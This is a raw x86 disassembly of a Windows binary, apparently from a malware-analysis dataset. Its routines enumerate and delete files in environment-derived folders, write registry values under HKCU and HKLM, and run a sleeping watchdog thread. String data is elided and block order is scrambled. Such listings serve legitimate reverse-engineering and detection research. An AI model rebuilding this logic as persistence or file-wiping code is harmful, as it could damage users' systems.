lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec eax
je r-xdata
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
xor bl bl
jmp r-xdata
pop ebx
leave
retn
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
sub_4060d4
push ebp
mov ebp esp
sub esp 0x24
push ebx
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
mov bl 0x1
call [ GetLastError@IAT ]
dec eax
dec eax
je r-xdata
push 0x0
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec eax
je r-xdata
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
xor bl bl
jmp r-xdata
pop ebx
leave
retn
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
sub_40619e
push ebp
mov ebp esp
sub esp 0x1b8
push ebx
push esi
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x48 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1b8 ]
push eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ FindFirstFileA@IAT ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
lea eax [ ebp - 0x1b8 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
xor ebx ebx
test eax eax
je r-xdata
push 0xffffffff
call [ FindClose@IAT ]
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
mov bl 0x1
jmp r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
push 0x2
pop edi
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
jmp r-xdata
lea eax [ ebp - 0x1b8 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x18c ]
pop edi
pop esi
pop ebx
leave
retn
test [ ebp - 0x1b8 ] 0x10
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov esi r--data
lea eax [ ebp - 0x18c ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax edi
add esi edi
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x18c ]
push r--data
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x38 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x18c ]
push r--data
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x68 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x48 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x68 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x78 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ rw-data ] bl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
cmp [ rw-data ] bl
jne r-xdata
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
cmp eax ebx
je r-xdata
add eax edi
add esi edi
cmp cl bl
jne r-xdata
cmp [ rw-data ] bl
je r-xdata
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
call [ GetLastError@IAT ]
sub eax edi
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
cmp [ rw-data ] bl
jne r-xdata
mov [ rw-data ] 0x1
call [ GetLastError@IAT ]
sub eax edi
jne r-xdata
mov [ rw-data ] bl
jmp r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
mov bl 0x1
mov [ rw-data ] bl
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
sub_4064e3
push ebp
mov ebp esp
sub esp 0x188
push ebx
lea eax [ ebp - 0x1 ]
push esi
push eax
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x188 ]
push eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ FindFirstFileA@IAT ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
lea eax [ ebp - 0x188 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
xor ebx ebx
push 0xffffffff
call [ FindClose@IAT ]
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
test [ ebp - 0x188 ] 0x10
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
mov bl 0x1
lea eax [ ebp - 0x188 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
jmp r-xdata
mov esi r--data
lea eax [ ebp - 0x15c ]
pop esi
pop ebx
leave
retn
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov esi r--data
lea eax [ ebp - 0x15c ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
inc eax
inc eax
inc esi
inc esi
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x15c ]
push r--data
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x38 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ GetLastError@IAT ]
dec eax
dec eax
jne r-xdata
cmp eax ebx
je r-xdata
inc eax
inc eax
inc esi
inc esi
cmp cl bl
jne r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
jmp r-xdata
sub_40673b
push ebp
mov ebp esp
sub esp 0x138
push ebx
lea eax [ ebp - 0x1 ]
push esi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor ebx ebx
lea eax [ ebp - 0x24 ]
push ebx
push r--data
push r--data
push 0x80000001
push eax
mov [ ebp - 0x1 ] bl
call sub_40a43e
add esp 0x14
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x138 ]
push 0x104
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ ExpandEnvironmentStringsA@IAT ]
lea eax [ ebp - 0x138 ]
push eax
call [ PathFileExistsA@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
mov bl 0x1
jmp r-xdata
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_410ee4
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_411379
pop ecx
mov esi eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp esi ebx
push ebx
je r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop esi
pop ebx
leave
retn
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
test eax eax
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x2 ]
mov ecx esp
push eax
push r--data
jmp r-xdata
mov bl [ ebp - 0x1 ]
push ebx
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov [ ebp - 0x1 ] 0x1
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_4068bb
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push [ rw-data ]
mov esi [ Sleep@IAT ]
mov [ rw-data ] 0x1
call esi
xor ebx ebx
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x5 ] bl
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x2 ] bl
jne r-xdata
call sub_40673b
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x5 ] bl
jne r-xdata
call sub_4064e3
mov [ ebp - 0x2 ] al
cmp [ ebp - 0x3 ] bl
jne r-xdata
call sub_40619e
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x4 ] bl
jne r-xdata
call sub_4060d4
mov [ ebp - 0x3 ] al
cmp [ ebp - 0x1 ] bl
je r-xdata
call sub_40600a
mov [ ebp - 0x4 ] al
push 0x1388
call esi
cmp [ ebp - 0x2 ] bl
je r-xdata
cmp [ ebp - 0x2 ] bl
je r-xdata
cmp [ ebp - 0x3 ] bl
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ ebp - 0x3 ] bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp - 0x5 ] bl
jne r-xdata
cmp [ ebp - 0x5 ] bl
je r-xdata
cmp [ ebp - 0x1 ] bl
je r-xdata
push ebx
lea eax [ ebp - 0x5 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
cmp [ rw-data ] bl
je r-xdata
mov [ rw-data ] bl
pop esi
xor eax eax
pop ebx
leave
retn
push 0x1
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a6fe
add esp 0x10
sub_4069b5
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov al [ ebp + 0x8 ]
imul ecx ecx 0xea60
push ebx
push esi
test al al
push edi
mov [ rw-data ] al
mov [ rw-data ] ecx
je r-xdata
xor eax eax
and [ ebp + 0x8 ] 0x0
mov ebx r--data
mov edi rw-data
push ebx
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi 0x80000001
push eax
push esi
call sub_40a39b
add esp 0xc
test al al
je r-xdata
lea eax [ ebp + 0x8 ]
mov ecx edi
push eax
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_40a3e4
xor eax eax
add esp 0x10
cmp [ ebp + 0x8 ] eax
je r-xdata
push eax
push eax
push eax
push sub_4068bb
push eax
push eax
call [ CreateThread@IAT ]
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_406a9e
push ebx
mov ebx rw-data
push esi
push edi
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0x10
mov eax esp
push rw-data
push eax
call sub_410fa4
pop ecx
pop ecx
push 0x6c
sub esp 0x10
mov eax esp
push rw-data
push eax
call sub_410fa4
pop ecx
pop ecx
push 0x6d
jmp r-xdata
mov ecx ebx
call sub_402062
push 0x0
push sub_406b0e
mov ecx ebx
call sub_4020e9
pop edi
pop esi
pop ebx
retn
sub_406b0e
push ebp
mov ebp esp
sub esp 0x20
push esi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp + 0xc ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41113a
mov eax esi
add esp 0x24
sub eax 0x42
je r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_405cd4
test eax eax
pop ecx
je r-xdata
dec eax
jne r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401ad8
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
pop esi
leave
retn
push r--data
push eax
call sub_405f2e
push ecx
push ecx
mov [ rw-data ] eax
mov eax esp
push rw-data
push eax
mov [ rw-data ] 0x1
call sub_410fa4
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
push 0x6d
call sub_402062
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
sub_406cd5
push ebp
mov ebp esp
sub esp 0x30
cmp [ ebp + 0x8 ] 0x1
push ebx
push esi
push edi
mov esi r--data
mov edi rw-data
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ebx esp
push esi
push edi
push esi
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push [ ebp + 0x1c ]
push r--data
push 0x80000001
call sub_40a690
add esp 0x20
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ebx esp
push esi
push edi
push esi
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push [ ebp + 0x1c ]
push r--data
push 0x80000002
call sub_40a690
add esp 0x20
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp + 0xb ]
sub esp 0x10
lea ecx [ ebp - 0x30 ]
mov ebx esp
push esi
push edi
push esi
push eax
push r--data
